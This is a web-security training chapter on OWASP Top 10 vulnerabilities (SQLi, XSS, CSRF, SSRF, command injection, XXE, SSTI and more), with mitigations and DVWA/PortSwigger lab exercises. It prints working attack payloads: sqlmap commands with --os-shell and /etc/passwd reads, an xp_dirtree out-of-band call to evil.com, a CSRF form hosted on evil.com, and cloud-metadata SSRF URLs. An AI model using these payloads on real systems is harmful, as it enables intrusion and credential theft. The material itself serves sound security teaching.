---
title: "OWASP Top 10 and beyond — basic web vulnerabilities"
area: "Web"
order: 10
level: "intermediate"
summary: "SQL injection, XSS, CSRF, SSRF, IDOR, command injection, path traversal, file upload, broken auth, XXE, sensitive data exposure. The vulnerabilities you'll find in 90% of web pentests."
prereq:
  - "Section 04 (HTTP/TLS), 07 (programming)"
tools:
  - "Burp Suite Community"
  - "OWASP ZAP"
  - "sqlmap, ffuf"
  - "DVWA, OWASP Juice Shop, WebGoat"
  - "PortSwigger Web Security Academy (free labs)"
---

# OWASP Top 10 and beyond

> If someone asked you to "list the 10 most common web vulnerabilities", you should be able to answer from memory. Not just the names: the mechanisms, the typical payloads, the real mitigations.

## OWASP Top 10 — 2021 version

| # | Category | Example |
|---|---|---|
| A01 | Broken Access Control | IDOR, missing function-level access control |
| A02 | Cryptographic Failures | cleartext passwords, weak TLS, broken JWT |
| A03 | Injection | SQLi, NoSQLi, command injection, LDAP injection |
| A04 | Insecure Design | insecure architectural flows |
| A05 | Security Misconfiguration | default credentials, verbose errors, missing headers |
| A06 | Vulnerable and Outdated Components | libraries with known CVEs |
| A07 | Identification and Authentication Failures | brute force, no rate limit, weak password recovery |
| A08 | Software and Data Integrity Failures | npm/PyPI typosquatting, untrusted deserialization |
| A09 | Security Logging and Monitoring Failures | no logs, no alerts |
| A10 | Server-Side Request Forgery (SSRF) | webhook that accepts a user URL → internal fetch |

It's not a list ordered by "severity", but by **frequency × impact**. The OWASP API Security Top 10 (for REST/GraphQL APIs) is separate: BOLA, broken auth, BOPLA, etc.

## SQL Injection (SQLi)

### How it happens
SQL string built by concatenating unsanitized user input.

```php
// VULNERABLE
$id = $_GET['id'];
$q = "SELECT * FROM users WHERE id = $id";
mysqli_query($conn, $q);
```

Input: `1 OR 1=1` → query `SELECT * FROM users WHERE id = 1 OR 1=1` → returns all users.

### Types
- **In-band / classic**: output appears directly in the response.
  - **UNION-based**: add `UNION SELECT col1,col2,...` to read other tables.
  - **Error-based**: SQL errors leak part of the data (`extractvalue()` MySQL, `cast` PostgreSQL).
- **Blind**:
  - **Boolean-based**: the response changes (true/false) depending on a condition.
  - **Time-based**: use `SLEEP(5)` (MySQL) / `pg_sleep(5)` (PostgreSQL) to infer data from timing.
- **Out-of-band (OOB)**: trigger a DNS/HTTP request from the server (in MSSQL `xp_dirtree \\evil.com\x`, MySQL `LOAD_FILE`, etc.).

### Typical payloads

```sql
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1, table_name, NULL FROM information_schema.tables --
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a' --
'; DROP TABLE users; --      (usually doesn't work because of prepared statements/driver limits)
1 OR SLEEP(5)
```

### Tool: sqlmap

```bash
sqlmap -u "https://target/item?id=1" --batch
sqlmap -u "..." --data="id=1&token=xxx" -p id --dbs
sqlmap -u "..." --cookie="session=abc" --level=5 --risk=3
sqlmap -u "..." --file-read=/etc/passwd
sqlmap -u "..." --os-shell                     # if it allows: shell on the DB server
sqlmap -r request.txt --tamper=space2comment   # tamper for WAF bypass
```

**`--level`** and **`--risk`** increase the payloads tried. 1=default; 5=everything, including dangerous techniques.

### Mitigation
- **Prepared statements** / parameterized queries. **Always.**
  ```python
  cursor.execute("SELECT * FROM users WHERE id = %s", (id,))
  ```
- ORM (SQLAlchemy, Django, Hibernate) if used correctly.
- **DON'T** roll your own sanitization with escaping: too many edge cases (UTF-8, charset, second-order).
- Principle of least privilege on DB users (the app shouldn't be DBA).
- WAF as a *secondary layer*, never the only one.

### NoSQL injection
With MongoDB, payloads like `{"$gt": ""}` bypass authentication if the app reads JSON and passes it to the driver without validation:

```js
// vulnerable
db.users.findOne({username: req.body.username, password: req.body.password})
// if body is {"username":"admin","password":{"$gt":""}}
```

Mitigation: validate input types (string only), schema validation (Mongoose, JSON Schema).

## XSS (Cross-Site Scripting)

Injection of JS into pages served by the target → executes in victims' browsers with their cookies/sessions.

### Types
- **Reflected**: input in the URL/parameter is reflected in the response. `?q=<script>alert(1)</script>`.
- **Stored**: input saved (comments, profiles, messages) and executed for anyone who views it.
- **DOM-based**: the sink is client-side JS that reads from `location.hash` / `document.referrer` and writes to `innerHTML`.
- **Mutation XSS (mXSS)**: the browser "mutates" apparently safe markup into an executable payload.
- **Self-XSS** (the user injects against themselves) — not serious on its own, but combinable with CSRF.

### Impact
- Cookie theft (if not `HttpOnly`).
- In-app phishing (fake forms).
- Keylogger on the victim page.
- Performing actions as the user (CSRF-by-XSS).
- MFA bypass (in some flows, read the OTP code from the DOM).
- Account takeover.

### Payloads (selection)

```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<a href="javascript:alert(1)">x</a>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
"><script>alert(1)</script>      <!-- escape attribute -->
';alert(1);//                    <!-- escape JS string -->
```

Repository: [PayloadsAllTheThings/XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection).

### Mitigations
- **Context-aware output encoding**: HTML body, attribute, JS string, URL, CSS. Every context has a different encoding.
- **Safe template engine**: React/Vue auto-escape by default (watch out for `dangerouslySetInnerHTML`).
- **Strict CSP**: no `unsafe-inline`, nonces/hashes, whitelisted sources.
- **HttpOnly cookies**.
- **Trusted Types** (Chrome): blocks `innerHTML` with non-Trusted-Types strings.
- **Input validation** where possible (whitelist).
- **Sanitization** if you have to accept user HTML: DOMPurify (with a policy).

## CSRF (Cross-Site Request Forgery)

The attacker makes the victim's browser execute an authenticated request against the target site. It works if:
- the victim is logged in,
- the site trusts the session cookie alone,
- there's no anti-CSRF.

### Classic example
Target site: changes email with `POST /account/email` body `email=...`. The attacker hosts on `evil.com`:

```html
<form action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```

When the logged-in victim visits evil.com, the email gets changed.

### Mitigations
- **SameSite cookie** (`Lax` or `Strict`) — already a big help, but doesn't replace tokens in all cases.
- **Anti-CSRF token**: random token per session (or per request), sent in a hidden field + verified server-side.
- **Double submit cookie** pattern.
- **Origin/Referer check** (weak, but useful).
- For **APIs**: no cookies, use the Authorization header → CSRF doesn't apply (CORS does).

## SSRF (Server-Side Request Forgery)

The server makes HTTP/other requests to a URL controlled by the attacker. Consequences:
- Access to internal services (Redis, ES, internal admin).
- Cloud metadata:
  - **AWS IMDS** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
  - **GCP** `http://metadata.google.internal/`.
  - **Azure IMDS** `http://169.254.169.254/metadata/instance?api-version=...` (requires `Metadata: true` header).
- Internal port scanning.
- SSRF + Redis without auth → RCE.

### Example
`POST /api/preview` body `{"url":"https://example.com"}` → server makes a GET and extracts a preview. The attacker sends `{"url":"http://169.254.169.254/latest/meta-data/..."}` → leak of EC2 credentials.

### Mitigations
- **Whitelist** of allowed domains (no blacklists).
- Resolve DNS, check the resulting IP, **reject RFC 1918 / link-local / loopback**.
- Use a network namespace or egress proxy that blocks the metadata IP.
- **AWS IMDSv2** (token-based, primary mitigation).
- Disable non-HTTP URL schemes (`file://`, `gopher://`, `dict://`).
- DNS rebinding: double validation (resolve, check, then call back with the same IP).

## IDOR / BOLA (Broken Object Level Authorization)

Example: `GET /api/orders/123` → returns order 123. If you change it to `124` and you see another user's order → IDOR.

**It's A01 in the Top 10**, and #1 in the API Top 10. A very common category, underestimated.

### Mitigation
- **Authorization check** server-side: does the current user own this object? Do they have the role to access it?
- "Unguessable URL" is not enough (security by obscurity).
- UUIDs are not auth: they help against ID brute force, not against IDOR via leak.

## Command Injection

Input passed to the shell without sanitization:

```php
system("ping -c 1 " . $_GET['host']);
```

Input: `127.0.0.1; cat /etc/passwd` → the shell executes both commands.

Exploitable shell operators: `;`, `|`, `&&`, `||`, `&`, backtick `` ` ``, `$(...)`, newline.

### Filter bypass
- Hex/oct: `$(echo -e \\x63\\x61\\x74)` → `cat`.
- Variables: `${IFS}` as space.
- Wildcard: `/?in/c?t`.
- URL encoding.

### Mitigation
- **Never concatenate input into the shell.**
- Use explicit APIs (`execve(["/bin/ping", "-c", "1", host])` with argv array → no shell).
- Whitelist input if you really must.

## Path Traversal / LFI

`GET /static?file=../../../../etc/passwd` → system file leak. If PHP, **LFI to RCE** is possible via:
- log injection in apache access log → include as PHP.
- `php://filter/convert.base64-encode/resource=...` to read sources.
- `php://input` or `data://` if `allow_url_include=On`.
- Phar deserialization.
- LFI → SSRF if `phar://` or `expect://`.

### Mitigation
- Normalize the path (`realpath`), then check it starts with the allowed base directory.
- Whitelist filenames.
- Container/chroot.

## File Upload

Bug pattern: the app allows uploads and then serves the files. If it accepts `.php` or files that become executable in the server context → RCE.

### Typical bypasses
- Double extension: `shell.php.jpg`, old Apache server config executes as PHP.
- Header `Content-Type: image/png` but PHP body.
- Null byte (old PHP): `shell.php%00.jpg`.
- Malicious `.htaccess` file if the user can upload it.
- Polyglot: valid GIF + PHP file.
- SVG with `<script>` → XSS.
- ImageMagick → ImageTragick CVE-2016-3714.

### Mitigation
- Whitelist extensions.
- Verify content (parser library).
- Save with a random name, outside the webroot.
- Serve from a CDN on a different domain.
- Disable PHP execution in the upload dir (server config).

## XXE (XML External Entity)

If the server parses XML and accepts external entities:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

Consequences: LFI, SSRF, DoS (billion laughs), RCE in extreme cases.

### Mitigation
- Disable external DTD parsing (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`).
- libxml2 / lxml: `defusedxml` in Python.
- Prefer JSON when possible.

## Insecure Deserialization

When the server deserializes user-controlled data with a format that allows object instantiation (Python `pickle`, Java `ObjectInputStream`, PHP `unserialize`, .NET BinaryFormatter):

- **Java**: ysoserial → CommonsCollections/Spring gadget chain → RCE.
- **PHP**: `__wakeup`, `__destruct` magic methods → POP chain.
- **Python**: `pickle.loads` with attacker bytes = immediate RCE (never do it).
- **.NET**: BinaryFormatter, SoapFormatter → RCE (deprecated by Microsoft).
- **Node**: `node-serialize` with `_$$ND_FUNC$$_`.

### Mitigation
- **Don't deserialize** untrusted data.
- If you must, use pure-data formats (JSON, MsgPack without arbitrary types).
- Allowlist of deserializable classes.
- HMAC signature of the payload if it comes from the client.

## Server-Side Template Injection (SSTI)

When the app builds a template using user strings:

```python
from jinja2 import Template
Template("Hello " + user_input).render()
```

Input: `{{7*7}}` → "Hello 49" → confirms SSTI.
Going further: `{{ ''.__class__.__mro__[1].__subclasses__() }}` → gadget chain → RCE.

Typical vulnerable template engines: **Jinja2, Twig, Smarty, Velocity, Thymeleaf, Freemarker, Mustache (limited), ERB**.

### Mitigation
- Use context-only templates.
- Sandbox the template engine.
- **Never** template + input concatenation.

## Open Redirect

`GET /redirect?url=https://evil.com` → server does a 302. Used in phishing to disguise URLs.

Mitigation: whitelist hosts. **Filtering by `http`/`https` prefix is not enough**.

## Broken Authentication (A07)

- **Brute force** + no rate limit + no lockout = account takeover.
- **Account enumeration** via different responses (login fail vs user does not exist).
- **Password reset** broken: predictable link, no expiration, token in URL leaked via Referer.
- **2FA bypass**: response replay, race, weak fallback.
- **Broken JWT** (see section 11).
- **Session fixation**: the attacker sets a session ID for the victim.

## Sensitive Data Exposure

- **Missing TLS** or weak.
- **Hardcoded secrets** in the client JS bundle.
- **API endpoints** that return too much data ("over-fetching").
- **GraphQL introspection** left in production.
- **Backup files** downloadable (`.bak`, `.zip`, `.git/`).
- **JWT with sensitive data** in the payload (cleartext, base64).
- **Verbose debug** error messages.

## Security Misconfiguration

- Default credentials on admin panels.
- Directory listing.
- Verbose server errors (stack traces).
- HTTP methods enabled (PUT, DELETE, TRACE).
- Outdated software (known CVEs).
- Missing security headers (CSP, HSTS).
- Overly permissive CORS.

## Vulnerable Components

Outdated dependencies. Tools:
- **OWASP Dependency-Check, Snyk, Dependabot, Renovate** for repos.
- **Trivy, Grype** for containers.
- **Software Bill of Materials (SBOM)**: SPDX, CycloneDX.

## Logging and Monitoring Failures

The company that gets compromised for 6 months without noticing is the one without logging. For offensive: they often *don't* log your attacks. For blue team: monitor authentications, errors, access to sensitive resources, anomalies.

## Web pentest workflow

1. **Recon**: subdomains, tech stack, content, API endpoints.
2. **Auth surface**: registration, login, password reset, 2FA.
3. **Authorization**: roles, multi-tenancy.
4. **Input fuzzing**: every parameter tested for injection.
5. **Business logic**: race conditions, manipulated pricing, skipped workflows.
6. **Client-side**: XSS, CSP, postMessage, prototype pollution.
7. **API**: BOLA/BFLA/Mass assignment.
8. **Storage and session**: cookies, JWT, localStorage.
9. **File handling**: upload, download.
10. **Misconfig**: headers, errors, defaults.

## Exercises

### Exercise 10.1 — DVWA full runs
Install DVWA. For each vuln (SQLi, XSS, Command Injection, File Upload, CSRF, File Inclusion):
- **Low** — exploit it manually (curl/Burp).
- **Medium** — understand the naïve mitigation, bypass it.
- **High** — the serious mitigation, understand why it isn't enough or if it is.

### Exercise 10.2 — sqlmap end-to-end
On DVWA SQLi (medium):

```bash
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=medium; PHPSESSID=..." --batch --dbs --dbms=mysql
sqlmap -u "..." --cookie="..." -D dvwa --tables
sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
```

How many passwords can you extract?

### Exercise 10.3 — Guided XSS
PortSwigger Web Security Academy has 30+ free XSS labs. Complete at least:
- 4 reflected,
- 4 stored,
- 2 DOM-based,
- 2 CSP bypass.

They are guided and rewarding.

### Exercise 10.4 — Juice Shop
[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) — a modern vulnerable application (Node/Angular). Complete at least the ⭐ and ⭐⭐ levels. They are gamified challenges.

### Exercise 10.5 — IDOR hunting
On an API that returns authenticated orders (e.g. WebGoat lab), enumerate IDs with Burp Intruder. How many records of other users can you see?

### Exercise 10.6 — SSRF in practice
PortSwigger Academy SSRF lab — complete "Basic SSRF against the local server", "Basic SSRF against another back-end system", "SSRF with blacklist-based input filter". Study bypasses: `127.1`, `127.0.0.1.nip.io`, `[::1]`, decimal IP, octal IP.

### Exercise 10.7 — Reverse engineer a defense
You find a vulnerable site and disable its own CSP by writing a PoC that bypasses `script-src 'self' 'unsafe-inline'`. Which payload category do you use? What would change with `'strict-dynamic' 'nonce-xyz'`?

### Exercise 10.8 — File upload polyglot
Create a PHP file that is also a valid JPEG (polyglot). Upload it to a vulnerable app (DVWA or a lab) and get RCE. Which check is bypassed?

## Key concepts

1. **Memorize the Top 10 and the mechanisms.**
2. **Injection of any kind** → loss of logical control if you don't separate data and code.
3. **XSS is almost always present**: look for every sink that puts input into output.
4. **IDOR/BOLA is the most underestimated category.**
5. **SSRF + cloud metadata** = full compromise. Disable IMDSv1.
6. **Never deserialize untrusted data** in arbitrary formats.
7. **CSP is the safety net** for XSS — but it's not enough.
8. **PortSwigger Academy** is the best way to learn vulnerabilities with immediate feedback.

Now we level up: advanced web hacking.
